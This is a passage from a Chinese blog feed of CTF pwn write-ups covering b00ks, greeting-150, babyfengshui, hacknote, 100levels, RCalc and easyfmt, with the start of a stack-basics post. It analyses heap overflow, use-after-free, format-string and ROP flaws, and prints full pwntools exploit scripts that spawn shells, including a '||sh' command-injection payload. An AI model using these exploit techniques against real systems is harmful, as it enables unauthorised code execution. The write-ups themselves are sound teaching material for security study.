    <content type="html"><![CDATA[<p>#ctf-wiki</p><p>##off-by-one</p><p>1-只能修改一个字节，溢出可控字节，通过修改堆块大小造成堆重叠从而覆盖或泄露其他数据。</p><p>2-溢出NULL字节可以使prev_inuse位被清0，前块会被认为是free块，从而造成堆重叠。</p><p>下面以该题作为演示</p><p>Asis CTF 2016 b00ks</p><pre><code>__int64 __fastcall over_one(_BYTE *chunk, int size)&#123;  int i; // [rsp+14h] [rbp-Ch]  if ( size &lt;= 0 )    return 0LL;  for ( i = 0; ; ++i )  &#123;    if ( read(0, chunk, 1uLL) != 1 )      return 1LL;    if ( *chunk == 10 )      break;    ++chunk;    if ( i == size )      break;  &#125;  *chunk = 0;  return 0LL;&#125;</code></pre><p>这里最后有NULL溢出。</p><pre><code>.data:0000000000202010 chunk_array     dq offset unk_202060    ; DATA XREF: find_temp:loc_B38↑o.data:0000000000202010                                         ; delet:loc_C1B↑o ....data:0000000000202018 off_202018      dq offset unk_202040    ; DATA XREF: change+15↑o</code></pre><p>这里可以发现off_202018（author）与chunk_array只相差了0x20个字，因此我们可以写入0x20个字符，然后打印溢出chunk_array所存储的地址。</p><p>关键的地方来了，我们可以通过适当的调整size大小，使得prt_des的后两位正好是00，然后再修改author，使得chunk_array【0】指向了ptr_des。若此时我们再在des中伪造了一个结构体,并使chunk_array可以索引到book2,这样就形成了堆重叠。可以分配edit book1 ，book2来修改free_hook。</p><p>那么我们先create两个book,经过调试发现，当name_size为0x20时ptr_des的位置符合需求。而第二个book有通过vmmap泄露libc_base 的功能，所以需要很大的空间，使系统单独映射一段内存从而泄露libc</p><p>1.首先通过填满author泄露chunk_array【1】所存储的struct_book1 的地址。</p><p><img src="https://i.loli.net/2021/09/24/f84RvlpVqoTgK2B.png"></p><p>2.在book1的des段填充数据使其存储book2的ptr_name ptr_des</p><p>3.然后通过打印泄露出book2的各种地址</p><p>4.之后再次填充author使得chunk_array【1】指向了book1的des段。</p><p>5.最后edit_book1写入free_hook,再edit_book2写入one_gadget,然后执行free函数即可get_shell</p><p><img src="https://i.loli.net/2021/09/24/UawSy1PYnF47cbT.png"></p><p>调试libc偏移</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#ctf-wiki&lt;/p&gt;
&lt;p&gt;##off-by-one&lt;/p&gt;
&lt;p&gt;1-只能修改一个字节，溢出可控字节，通过修改堆块大小造成堆重叠从而覆盖或泄露其他数据。&lt;/p&gt;
&lt;p&gt;2-溢出NULL字节可以使prev_inuse位被清0，前块会被认为是free块，从而造成堆重叠。</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>buuctf&amp;&amp;攻防世界2</title>
    <link href="http://example.com/2021/08/04/A%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn(2)/"/>
    <id>http://example.com/2021/08/04/A%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn(2)/</id>
    <published>2021-08-04T15:23:31.656Z</published>
    <updated>2022-07-02T02:55:09.387Z</updated>
    
    <content type="html"><![CDATA[<p>#pwn进阶区</p><p>##greeting-150</p><p>这是个明显的字符串漏洞</p><pre><code>return printf(s);</code></pre><p>思路就是修改strlen函数为system，并且让函数循环执行，从而getshell</p><p>在程序末尾会执行fini函数，我们将其修改为start_addr</p><p>我们先输入aaaa%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p来观察输入的字符串在第几个参数</p><p><img src="https://i.loli.net/2021/08/16/dATjuN5JnUmr92e.png"></p><p>由上图可知，只需对齐2字节，那么下一个参数就出现在第12个。</p><p>首先修改strlen_got的高字节（因为它比较小），那么修改的大小是<br>0x804 - (len(‘aa’) + len(‘Nice to meet you, ‘) + 4 * 4) = 2016</p><p>fini_got的高字节相同</p><p>然后分别是strlen_got的低字节和fini_got的低字节（因为system的低字节更小）</p><p>最后传入”/bin/sh”即可</p><p>##babyfengshui</p><p>有四个功能如下：</p><p><img src="https://i.loli.net/2021/08/04/71OHyQxLjbqusNa.gif"></p><p>其中add_usr的功能：</p><p><img src="https://i.loli.net/2021/08/04/b7yZDnAQxMwaSs2.gif"></p><pre><code>  p_discri = malloc(size);    //用于存放discription堆  memset(p_discri, 0, size);  v3 = malloc(0x80u);         //用于存放name堆  memset(v3, 0, 0x80u);  *v3 = p_discri;             //将discription堆的地址存放到name堆的首地址  *(&amp;array + num) = v3;       //将name堆的地址存放到数组  printf(&quot;name: &quot;);  fgets_addr_len(*(&amp;array + num) + 4, 124);  //向discription堆中写入  puts_text(num++);  return v3;</code></pre><p>所以add_usr一次会创建两个堆，并且会将name堆写入数组。</p><p>一下是Update a user description功能</p><pre><code>v3 = 0;printf(&quot;text length: &quot;);__isoc99_scanf(&quot;%u%c&quot;, &amp;v3, &amp;v2);if ( (v3 + **(&amp;array + num_next)) &gt;= *(&amp;array + num_next) - 4 )&#123;  puts(&quot;my l33t defenses cannot be fooled, cya!&quot;);  exit(1);&#125;printf(&quot;text: &quot;);fgets_addr_len(**(&amp;array + num_next), v3 + 1);</code></pre><p>if ( (v3 + **(&amp;array + num_next)) &gt;= *(&amp;array + num_next) - 4 )</p><p>这句当len &gt;= name_addr - discri_addr 时报错。这里默认了创建堆是连续的，然而通过我们的构造，可以让name堆 和 discription堆相隔很远，从而产生溢出。</p><p>先申请3个usr,并在3号usr的discription中写入”/bin/sh\x00”</p><pre><code>add_user(0x80,0x80,&quot;AAAA&quot;)            #0add_user(0x80,0x80,&quot;BBBB&quot;)            #1add_user(0x8,0x8,&quot;/bin/sh\x00&quot;)       #2</code></pre><p>之后dele_0号这是两个堆合并成为大小为0x100的chunk</p><pre><code>delete_user(0)add_user(0x100,0x19c,b&#39;D&#39;*(0x198) + p32(elf.got[&#39;free&#39;]))          #3</code></pre><p>溢出1号usr的discription为elf.got[‘free’]</p><pre><code>display_user(1)p.recvuntil(&quot;description: &quot;)free_addr = u32(p.recv(4))print(&quot;free_addr&quot;,hex(free_addr))libc = LibcSearcher(&#39;free&#39;,free_addr)libc_base = free_addr - libc.dump(&#39;free&#39;)system_addr = libc_base + libc.dump(&#39;system&#39;)</code></pre><p>泄露地址，并寻找system_addr</p><pre><code>printf(&quot;text: &quot;);fgets_addr_len(**(&amp;array + num_next), v3 + 1);</code></pre><p>利用Update a user description功能，向**(&amp;array + num_next)及elf.got[‘free’]存储的内容写入system.之后free_usr_1即可get_shell</p><pre><code>#!/usr/bin/python3from pwn import *from LibcSearcher import *p=remote(&#39;111.200.241.244&#39;,51565)elf=ELF(&#39;./babyfengshui&#39;)#context.log_level = &#39;debug&#39;#p = process(&#39;./babyfengshui&#39;)libc=ELF(&#39;./libc.so.6&#39;)def add_user(size, length, text):    p.sendlineafter(&quot;Action: &quot;, &#39;0&#39;)    p.sendlineafter(&quot;description: &quot;, str(size))    p.sendlineafter(&quot;name: &quot;, &#39;AAAA&#39;)    p.sendlineafter(&quot;length: &quot;, str(length))    p.sendlineafter(&quot;text: &quot;, text)def delete_user(idx):    p.sendlineafter(&quot;Action: &quot;, &#39;1&#39;)    p.sendlineafter(&quot;index: &quot;, str(idx))def display_user(idx):    p.sendlineafter(&quot;Action: &quot;, &#39;2&#39;)    p.sendlineafter(&quot;index: &quot;, str(idx))def update_desc(idx, length, text):    p.sendlineafter(&quot;Action: &quot;, &#39;3&#39;)    p.sendlineafter(&quot;index: &quot;, str(idx))    p.sendlineafter(&quot;length: &quot;, str(length))    p.sendlineafter(&quot;text: &quot;, text)add_user(0x80,0x80,&quot;AAAA&quot;)            #0add_user(0x80,0x80,&quot;BBBB&quot;)            #1add_user(0x8,0x8,&quot;/bin/sh\x00&quot;)       #2delete_user(0)add_user(0x100,0x19c,b&#39;D&#39;*(0x198) + p32(elf.got[&#39;free&#39;]))          #3#gdb.attach(p)display_user(1)p.recvuntil(&quot;description: &quot;)free_addr = u32(p.recv(4))print(&quot;free_addr&quot;,hex(free_addr))libc = LibcSearcher(&#39;free&#39;,free_addr)libc_base = free_addr - libc.dump(&#39;free&#39;)system_addr = libc_base + libc.dump(&#39;system&#39;)update_desc(1, 0x4, p32(system_addr))delete_user(2)p.interactive()</code></pre><hr><p>##hacknote</p><p>一共就三个功能</p><pre><code>int sub_8048956()&#123;  puts(&quot;----------------------&quot;);  puts(&quot;       HackNote       &quot;);  puts(&quot;----------------------&quot;);  puts(&quot; 1. Add note          &quot;);  puts(&quot; 2. Delete note       &quot;);  puts(&quot; 3. Print note        &quot;);  puts(&quot; 4. Exit              &quot;);  puts(&quot;----------------------&quot;);  return printf(&quot;Your choice :&quot;);&#125;</code></pre><p>Add: </p><pre><code>  if ( dword_804A04C &lt;= 5 )  &#123;    for ( i = 0; i &lt;= 4; ++i )    &#123;      if ( !*(&amp;ptr + i) )      &#123;        *(&amp;ptr + i) = malloc(8u);        if ( !*(&amp;ptr + i) )        &#123;          puts(&quot;Alloca Error&quot;);          exit(-1);        &#125;        **(&amp;ptr + i) = puts_a1_4;        printf(&quot;Note size :&quot;);        read(0, buf, 8u);        size = atoi(buf);        v0 = *(&amp;ptr + i);        *(v0 + 4) = malloc(size);        if ( !*(*(&amp;ptr + i) + 1) )        &#123;          puts(&quot;Alloca Error&quot;);          exit(-1);        &#125;        printf(&quot;Content :&quot;);        read(0, *(*(&amp;ptr + i) + 1), size);        puts(&quot;Success !&quot;);        ++dword_804A04C;        return __readgsdword(0x14u) ^ v5;      &#125;    &#125;  &#125;  else  &#123;    puts(&quot;Full&quot;);  &#125;</code></pre><p>Del:  漏洞就在这里，虽然free了chunk，但是并没有将指针归0 .</p><pre><code>  printf(&quot;Index :&quot;);  read(0, buf, 4u);  index = atoi(buf);  if ( index &lt; 0 || index &gt;= dword_804A04C )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;ptr + index) )  &#123;    free(*(*(&amp;ptr + index) + 1));    free(*(&amp;ptr + index));    puts(&quot;Success&quot;);  &#125;</code></pre><p>Show:</p><pre><code>  printf(&quot;Index :&quot;);  read(0, buf, 4u);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt;= dword_804A04C )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;ptr + v1) )    (**(&amp;ptr + v1))(*(&amp;ptr + v1));</code></pre><p><img src="https://i.loli.net/2021/08/10/9ivuNXx7W2aVShD.png"></p><p>chunk结构如图，malloc一个8字节chunk,在该chunk的首地址存储puts函数，并且它将会打印下一个chunk中的内容。</p><p>所以我们的思路就是，malloc两个该结构，并将其都free掉。然后再malloc一个同样为8字节的chunk.</p><p>由于之前free掉了数组中两个8字节的chunk，所以我们会直接取出这两个free_chunk,从而构成 了UAF漏洞。</p><p>我们只需要把puts_a1+4修改为system，把malloc_note修改为”/bin/sh\x00”然后在执行show函数，则可以get_shell</p><p>至于泄露地址，则可以通过show函数。直接向任意的note中写入一个函数地址，然后再show即可.</p><p>exp如下</p><pre><code>#! /usr/bin/python3#coding:utf8  from pwn import *  from LibcSearcher import *  #sh = process(&#39;./hacknote&#39;)  sh = remote(&#39;111.200.241.244&#39;,59975)#sh = process(&#39;./hacknote&#39;)  elf = ELF(&#39;./hacknote&#39;)  puts_got = elf.got[&#39;puts&#39;]  puts_plt = elf.plt[&#39;puts&#39;]  show_addr = 0x804862B  def create(size,content):     sh.sendlineafter(&#39;Your choice :&#39;,&#39;1&#39;)     sh.sendlineafter(&#39;Note size :&#39;,str(size))     sh.sendafter(&#39;Content :&#39;,content)  def delete(index):     sh.sendlineafter(&#39;Your choice :&#39;,&#39;2&#39;)     sh.sendlineafter(&#39;Index :&#39;,str(index))  def show(index):     sh.sendlineafter(&#39;Your choice :&#39;,&#39;3&#39;)     sh.sendlineafter(&#39;Index :&#39;,str(index))  #创建二个堆  create(0x20,&#39;a&#39;*0x20)  create(0x20,&#39;b&#39;*0x20)  delete(0)  delete(1)  payload = p32(0x804862B) + p32(puts_got)  #这个8字节空间正好分配到了note0的结构体处  create(0x8,payload)  #泄露puts的加载地址  show(0)  #获得puts的加载地址  puts_addr = u32(sh.recv(4))  #libc = LibcSearcher(&#39;puts&#39;,puts_addr)  #print hex(puts_addr)  #libc_base = puts_addr - libc.dump(&#39;puts&#39;)  #print &#39;libc base:&#39;,hex(libc_base)  #system_addr = libc_base + libc.dump(&#39;system&#39;)  #binsh_addr = libc_base + libc.dump(&#39;str_bin_sh&#39;) libc = ELF(&#39;libc_32.so.6&#39;) libc_base = puts_addr - libc.sym[&#39;puts&#39;] print (&#39;libc base:&#39;,hex(libc_base)) system_addr = libc_base + libc.sym[&#39;system&#39;] binsh_addr = libc_base + libc.search(b&#39;/bin/sh&#39;).__next__()delete(2)  payload = p32(system_addr) + b&#39;||sh\x00&#39;  create(0x8,payload)  # get shell  show(0)  sh.interactive() </code></pre><p>这个||sh是shell注入，因为按照原来的show的逻辑,是这样的</p><pre><code>system(note[i]);   </code></pre><p>而note[i]是一个结构体，前四字节是system的地址，接下来是||sh字符串，所以，传给system的字符串实际上时xxxx||sh，这是一种或表达式，相当于注入一样（||或操作）</p><p>##1000levevls</p><p>main函数如下</p><pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  int v3; // eax  __int64 v4; // rdx  __int64 v5; // rcx  sub_DDC();  logo();  while ( 1 )  &#123;    while ( 1 )    &#123;      menu();      v3 = str_to_l();      if ( v3 != 2 )        break;      Hint(a1, a2, v4, v5);    &#125;    if ( v3 == 3 )      break;    if ( v3 == 1 )    &#123;      go(a1, a2, v4, v5);    &#125;    else    &#123;      a1 = &quot;Wrong input&quot;;      puts(&quot;Wrong input&quot;);    &#125;  &#125;  puts_(a1, a2, v4, v5);  return 0LL;&#125;</code></pre><p>查看Hint函数</p><pre><code>int hint()&#123;  char v1[264]; // [rsp+8h] [rbp-108h] BYREF  if ( unk_20208C )    sprintf(v1, &quot;Hint: %p\n&quot;, &amp;system);  else    strcpy(v1, &quot;NO PWN NO FUN&quot;);  return puts(v1);&#125;.text:0000000000000D0A                 sub     rsp, 110h.text:0000000000000D11                 mov     rax, cs:system_ptr.text:0000000000000D18                 mov     [rbp+var_110], rax.text:0000000000000D1F                 lea     rax, unk_20208C</code></pre><p>发现这里把system的地址存放到了[rbp+var_110]</p><pre><code>int go()&#123;  __int64 v1; // [rsp+0h] [rbp-120h]  int v2; // [rsp+8h] [rbp-118h]  int v3; // [rsp+Ch] [rbp-114h]  __int64 v4; // [rsp+10h] [rbp-110h]  __int64 v5; // [rsp+10h] [rbp-110h]  __int64 v6; // [rsp+18h] [rbp-108h]  char v7[256]; // [rsp+20h] [rbp-100h] BYREF  puts(&quot;How many levels?&quot;);  v1 = str_to_l();  if ( v1 &gt; 0 )    v4 = v1;  else    puts(&quot;Coward&quot;);  puts(&quot;Any more?&quot;);  v5 = v4 + str_to_l();  if ( v5 &gt; 0 )  &#123;    if ( v5 &lt;= 99 )    &#123;      v6 = v5;    &#125;    else    &#123;      puts(&quot;You are being a real man.&quot;);      v6 = 100LL;    &#125;    puts(&quot;Let&#39;s go!&#39;&quot;);    v2 = time(0LL);    if ( the_game(v6) )    &#123;      v3 = time(0LL);      sprintf(v7, &quot;Great job! You finished %d levels in %d seconds\n&quot;, v6, (v3 - v2));      puts(v7);    &#125;    else    &#123;      puts(&quot;You failed.&quot;);    &#125;    exit(0);  &#125;  return puts(&quot;Coward Coward Coward Coward Coward&quot;);&#125;</code></pre><p>而在go函数中__int64 v4; // [rsp+10h] [rbp-110h]<br>并且go和hint由同一个函数调用，所以他们用于同样的rbp, 也就是说system的地址残留在了v4中</p><pre><code>  if ( v1 &gt; 0 )    v4 = v1;</code></pre><p>发现如果v1&lt;0那么v4不会被清0 ， 所以我们输入v1=0 。然后在输入one_gadget-system ，这样v5就存储了one_gadget的地址了</p><pre><code>v5 = v4 + str_to_l();</code></pre><p>因为go函数调用了game函数，所以game函数的栈开辟在go的上方。</p><pre><code>07:0038│     0x7ffdf3653e60 ◂— 0x11400000000pwndbg&gt; 08:0040│     0x7ffdf3653e68 ◂— 0xc0000001709:0048│ rbp 0x7ffdf3653e70 —▸ 0x7ffdf3653fa0 —▸ 0x7ffdf3653fe0 —▸ 0x55ca23ab7fd0 ◂— push   r150a:0050│     0x7ffdf3653e78 —▸ 0x55ca23ab7c8a ◂— test   eax, eax0b:0058│     0x7ffdf3653e80 ◂— 0xfffffffffffffeda0c:0060│     0x7ffdf3653e88 ◂— 0x55ca6141b4cb0d:0068│     0x7ffdf3653e90 —▸ 0x7f6dff55427a (do_system+1098) ◂— mov    rax, qword ptr [rip + 0x37ec37]</code></pre><p>我们需要在rbp+4后的位置上一直pop_ret直到执行one_gadget为止。</p><p>然而，pop在这里也用不了，因为是随机地址，我们找不到。</p><p>然而，有一个例外的东西，它的地址是固定的。那就是vsyscall</p><p>Vsyscall用于系统调用，它的地址固定在0xffffffffff600000-0xffffffffff601000，vsyscall在内核中实现，无法用docker模拟。因此某些虚拟机上可能不成功。</p><p>可以利用的vsyscall地址如下</p><pre><code>gettimeofday: 0xffffffffff600000</code></pre><p>这里我们可以把vsyscall函数当成ret的gadget，从而实现调用one_gadget</p><p>exp如下</p><pre><code>#! /usr/bin/python3from pwn import *io = process(&quot;./100levels&quot;)libc = ELF(&quot;./libc.so&quot;)one_gadget = 0x4526asystem = libc.sym[&#39;system&#39;]io.recvuntil(&quot;Choice:\n&quot;)io.send(&#39;2&#39;)io.recvuntil(&quot;Choice:\n&quot;)io.sendline(&#39;1&#39;)io.recvuntil(&quot;How many levels?\n&quot;)io.send(&#39;0&#39;)io.recvuntil(&quot;Any more?\n&quot;)io.send(str(one_gadget-system))def cacu ():   io.recvuntil(&quot;Question: &quot;)   num1 = int(io.recvuntil(&quot; &quot;))   print(&quot;num1 = &quot;+str(num1))   io.recvuntil(&quot;* &quot;)   num2 = int(io.recvuntil(&quot; &quot;))   print(&quot;num2 = &quot;+str(num2))   ans = num1 * num2   print (io.recvuntil(&quot;Answer:&quot;))   io.sendline(str(ans))   print(&quot;ans = &quot;+str(ans))for i in range(99):   cacu()gdb.attach(io)print (io.recvuntil(&quot;Answer:&quot;))payload = b&#39;a&#39;*0x38 + p64(0xffffffffff600000)*3io.send(payload)io.interactive()</code></pre><h2 id="RCacl"><a href="#RCacl" class="headerlink" title="RCacl"></a>RCacl</h2><h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><p>利用ida 动态调试分析程序运行逻辑：</p><p>首先申请了4个chunk。并且手动写了一个canary防护。在之后的每次函数调用的先set_canary 然后在该函数结束后 get_canary 并与其比较。</p><pre><code>__int64 __fastcall save(__int64 a1)&#123;  __int64 v1; // rsi  __int64 v2; // rdx  __int64 result; // rax  v1 = *(ma_1 + 8);  v2 = (*ma_1)++;  result = a1;  *(v1 + 8 * v2) = a1;  return result;&#125;</code></pre><p><img src="https://s2.loli.net/2022/06/29/zRLqnCBIfbF5pT6.png"></p><p>可以看出，在save函数中利用基地址+偏移的方式对结果进行储存。即在 0x6020F8 之后存储计算结果。</p><hr><p>set_canary,调用函数时设置canary</p><pre><code>__int64 set_canary()&#123;  __int64 v0; // rbx  __int64 v1; // rsi  __int64 v2; // rdx  unsigned int ptr; // [rsp+Ch] [rbp-24h] BYREF  __int64 v5; // [rsp+10h] [rbp-20h]  FILE *stream; // [rsp+18h] [rbp-18h]  if ( *ma_2 )  &#123;    ptr = *(*(ma_2 + 8) + 8LL * *ma_2 - 8);  &#125;  else  &#123;    stream = fopen(&quot;/dev/urandom&quot;, &quot;r&quot;);    fread(&amp;ptr, 1uLL, 4uLL, stream);    fclose(stream);  &#125;  srand(ptr);  v5 = rand();  v0 = v5 &lt;&lt; 32;  v5 = v0 | rand();  v1 = *(ma_2 + 8);  v2 = (*ma_2)++;  *(v1 + 8 * v2) = v5;  return v5;&#125;</code></pre><p>get_canary,调用函数时调用canary并且进行比较</p><pre><code>__int64 get_canary()&#123;  return *(*(ma_2 + 8) + 8LL * (*ma_2)-- - 8);&#125;</code></pre><p><img src="https://s2.loli.net/2022/06/29/MgJFEcpy6KNvAwt.png"></p><p>从save函数可以看出 v1 + 8 * v2 的地址上存储了每次计算结果的值 //*(v1 + 8 * v2) = a1; </p><p><strong>而每计算的次数没有限制，因此可以多次计算直至结果覆盖canary的储存地址</strong></p><p>继续观察代码，发现输入name时没有限制长度，存在溢出漏洞，可以利用其构造rop链。通过泄露libc从而找到基地址用系统调用getshell</p><p><img src="https://s2.loli.net/2022/06/29/vnKMRiEAbqkBfFr.png"></p><pre><code>#! /usr/bin/python3from pwn import *from LibcSearcher import *context.log_level=&#39;debug&#39;local=0if local:    sh=process(&#39;./RCalc&#39;)    libc=ELF(&#39;libc.so.6_remote&#39;)    libc_start_main_libc=libc.symbols[&#39;__libc_start_main&#39;]    system_libc=libc.symbols[&#39;system&#39;]    bin_sh_libc=libc.search(b&quot;/bin/sh&quot;).__next__()else:    sh=remote(&#39;111.200.241.244&#39;,&#39;53565&#39;)elf=ELF(&#39;./RCalc&#39;)libc_start_main_got=elf.got[&#39;__libc_start_main&#39;]printf_plt=elf.plt[&#39;printf&#39;]pop_rdi_addr=0x401123main_addr=0x401036def welcome(name):    sh.sendlineafter(&#39;Input your name pls: &#39;,name)def send_interger(int1,int2):    sh.recvuntil(&#39;input 2 integer: &#39;)    sh.sendline(str(int1))    sh.sendline(str(int2))def save_result(flag):    string=&#39;no&#39;    if flag:        string=&#39;yes&#39;    sh.sendafter(&#39;Save the result? &#39;,string)def add(int1,int2,flag):    sh.sendlineafter(&#39;Your choice:&#39;,&#39;1&#39;)    send_interger(int1,int2)    save_result(flag)def sub(int1,int2,flag):    sh.sendlineafter(&#39;Your choice:&#39;,&#39;2&#39;)    send_interger(int1,int2)    save_result(flag)def mod(int1,int2,flag):    sh.sendlineafter(&#39;Your choice:&#39;,&#39;3&#39;)    send_interger(int1,int2)    save_result(flag)def mul(int1,int2,flag):    sh.sendlineafter(&#39;Your choice:&#39;,&#39;4&#39;)    send_interger(int1,int2)    save_result(flag)def exit():    sh.sendlineafter(&#39;Your choice:&#39;,&#39;5&#39;)def heapOverflow():    for i in range(35):        add(0,0,1)padding=b&#39;a&#39;*0x108+p64(0)+p64(0xdeadbeef)payload=padding+p64(pop_rdi_addr)+p64(libc_start_main_got)+p64(printf_plt)+p64(main_addr)welcome(payload)heapOverflow()exit()libc_start_main_addr=u64(sh.recv(6).ljust(8,b&#39;\x00&#39;))if local:    libc_base=libc_start_main_addr-libc_start_main_libc    system_addr=system_libc+libc_base    bin_sh_addr=bin_sh_libc+libc_baseelse:    libc=LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_addr)    libc_base=libc_start_main_addr-libc.dump(&#39;__libc_start_main&#39;)    system_addr=libc_base+libc.dump(&#39;system&#39;)    bin_sh_addr=libc_base+libc.dump(&#39;str_bin_sh&#39;)payload=padding+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr)welcome(payload)heapOverflow()exit()sh.interactive()</code></pre><h2 id="easyfmt"><a href="#easyfmt" class="headerlink" title="easyfmt"></a>easyfmt</h2><p>观察代码</p><p>发现存在格式化字符串漏洞</p><p><img src="https://s2.loli.net/2022/07/02/62GqMb9Yjx1Xd4J.png"></p><p>进入checkin函数发现有一个随机的数字，需要通过爆破来通过</p><p><img src="https://s2.loli.net/2022/07/02/QBS3Ur21EADyJnm.png"></p><p>为了通过checkin，需要一个爆破脚本，不断发送1，如果错误就关闭连接重新循环，如果正确就break继续执行代码。</p><pre><code>while True :   io = process(&#39;./easyfmt&#39;)   #io = remote(&#39;111.200.241.244&#39;,64639)   io.sendlineafter(&#39;enter:&#39;,&#39;1&#39;)   ret = io.recv()   if ret.find(b&#39;bye&#39;) &lt; 0:      break   io.close</code></pre><p>利用%p确定参数位置，可以发现输入的字符在第8个参数的位置</p><p><img src="https://s2.loli.net/2022/07/02/brLK5JwPWTftc2Z.png"></p><p>为了让程序不退出，我们把exit.got 修改成main中结束checkin的位置，这样可以反复利用格式化字符串漏洞，也不需要再爆破checkin了。</p><pre><code>payload = b&#39;%2434c%10$hn&#39;         ###这里不可以用0x982代替2434，语法规则payload = payload.ljust(16, b&#39;a&#39;)payload += p64(elf.got[&#39;exit&#39;])io.sendline(payload)</code></pre><p>再次利用格式化字符串漏洞，利用%s 输出libc的地址</p><pre><code>payload=b&#39;%10$saaa&#39;+p64(read_got)   ###io.sendafter(&#39;slogan: &#39;,payload)io.recv(1)read_addr=u64(io.recvuntil(&#39;aaa&#39;,drop = True).ljust(8,b&#39;\x00&#39;))print(&quot;read--&gt;&quot;+hex(read_addr))</code></pre><p>//利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</p><p>比如这里用%p来获取栈上的值</p><p><img src="https://s2.loli.net/2022/07/02/3wOuVCobeNhMQIZ.png"></p><p>//利用 %s 来获取变量所对应地址的内容，只不过有零截断。</p><p>这里用%p来获对应地址的值</p><p><img src="https://s2.loli.net/2022/07/02/gJtH2mYx5pUe4nr.png"></p><p>得到libc的基地址，通过计算获取system的地址</p><pre><code>base = puts_got - libc.sym[&#39;puts&#39;]system = base + libc.sym[&#39;system&#39;]print(&#39;system---&gt;&#39;+hex(system))char1 = system&amp;0xffchar2 = ((system&amp;0xffffff)&gt;&gt;8)-char1  payload = b&#39;%&#39;+str(char1).encode() + b&#39;c%14$hhn&#39; + b&#39;%&#39; + str(char2).encode() + b&#39;c%15$hn&#39;payload = payload.ljust(32,b&#39;a&#39;) + p64(printf_got) + p64(printf_got+1)#gdb.attach(io)io.sendafter(&#39;slogan: &#39;,payload)io.sendafter(&#39;slogan: &#39;,&#39;/bin/sh\x00&#39;)</code></pre><p>利用%p获取参数位置，输入字符在第10个参数的位置，所以printf_got在第14个参数的位置</p><p><img src="https://s2.loli.net/2022/07/02/hZVk5cmTu69oXDG.png"></p><p>因为system和printf只有最后3个字节不同，所以只需要修改最后6个数，利用%14$hhn修改倒数第一个字节的值，利用%15$hn修改倒数第二，三个字节的值</p><p>//我们可以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。</p><p><img src="https://s2.loli.net/2022/07/02/jyRObvJG59dFnZh.png"></p><pre><code>#! /usr/bin/python3from pwn import*from LibcSearcher import*context.log_level = &#39;debug&#39;elf = ELF(&#39;./easyfmt&#39;)libc = elf.libcwhile True :   io = process(&#39;./easyfmt&#39;)   #io = remote(&#39;111.200.241.244&#39;,64639)   io.sendlineafter(&#39;enter:&#39;,&#39;1&#39;)   ret = io.recv()   if ret.find(b&#39;bye&#39;) &lt; 0:      break   io.close   #sleep(0.1)#io.recvuntil(&#39;slogan: &#39;)#io.recv()read_got=elf.got[&#39;read&#39;]printf_got=elf.got[&#39;printf&#39;]payload = b&#39;%2434c%10$hn&#39;         ###payload = payload.ljust(16, b&#39;a&#39;)payload += p64(elf.got[&#39;exit&#39;])io.sendline(payload)gdb.attach(io)payload=b&#39;%10$saaa&#39;+p64(read_got) io.sendafter(&#39;slogan: &#39;,payload)io.recv(1)read_addr=u64(io.recvuntil(&#39;aaa&#39;,drop = True).ljust(8,b&#39;\x00&#39;))print(&quot;read--&gt;&quot;+hex(read_addr))libc=LibcSearcher(&#39;read&#39;,read_addr)libc_base=read_addr-libc.dump(&#39;read&#39;)system_addr=libc_base+libc.dump(&#39;system&#39;)print(&quot;system--&gt;&quot;+hex(system_addr))char1=system_addr&amp;0xffpayload=b&#39;%&#39;+str(char1).encode()+b&#39;c%14$hhn&#39; ###char2=((system_addr&amp;0xffffff)&gt;&gt;8)-char1payload+=b&#39;%&#39;+str(char2).encode()+b&#39;c%15$hn&#39;payload=payload.ljust(32,b&#39;a&#39;)+p64(printf_got)+p64(printf_got+1)io.sendafter(&#39;slogan: &#39;,payload)io.sendafter(&#39;slogan: &#39;,&#39;/bin/sh\x00&#39;)io.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#pwn进阶区&lt;/p&gt;
&lt;p&gt;##greeting-150&lt;/p&gt;
&lt;p&gt;这是个明显的字符串漏洞&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;return printf(s);&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;思路就是修改strlen函数为system，并且让函数循环执行，从而getsh</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>缓冲区溢出-CTF-PWN</title>
    <link href="http://example.com/2021/01/30/PWN%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2021/01/30/PWN%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-01-30T01:48:45.145Z</published>
    <updated>2022-07-12T08:28:35.143Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/03/30/4Ycae86bfKsDMCE.gif"></p><h2 id="ida调试快捷键"><a href="#ida调试快捷键" class="headerlink" title="ida调试快捷键"></a>ida调试快捷键</h2><p><img src="https://s2.loli.net/2022/06/02/HQDGO3gy9BWT647.png"></p><p>一字节等于8位或者说8比特</p><p>2字节==16位</p><p>1字长32位PC的字长是32bit，现在开始成为主流的64位CPU字长是64bit，手机上使用较多的ARM处理器大多数是32位</p><h1 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h1><p>64位： 当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</p><p>32位： 用栈传参</p><h1 id="常用寄存器"><a href="#常用寄存器" class="headerlink" title="常用寄存器"></a>常用寄存器</h1><p>和8086稍有区别，具体如下</p><p><img src="https://i.loli.net/2021/01/30/KJpQyoDv7jRdxeV.gif"></p><h1 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h1><p><img 